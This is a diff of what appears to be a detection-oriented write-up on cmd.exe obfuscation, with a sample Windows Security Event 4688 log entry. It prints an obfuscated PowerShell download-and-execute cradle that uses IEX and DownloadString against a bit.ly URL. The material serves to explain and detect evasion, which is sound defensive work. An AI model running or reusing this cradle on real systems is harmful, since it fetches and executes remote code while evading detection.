@@ -66,7 +66,7 @@ Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFI
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
 ![binex 3](https://i.ibb.co/HK50bQW/image.png)<br>
-This is how it's going to look in WEL:
+This is how it's going to look in WEL Security Event ID 4688:
 ```XML
 - <EventData>
   <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
@@ -80,7 +80,6 @@ This is how it's going to look in WEL:
   <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)" </Data> 
   </EventData>
 ```
-*obfuscated command in the CMD WEL Security Event ID 4688<br>
 
 ### ENCODING
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
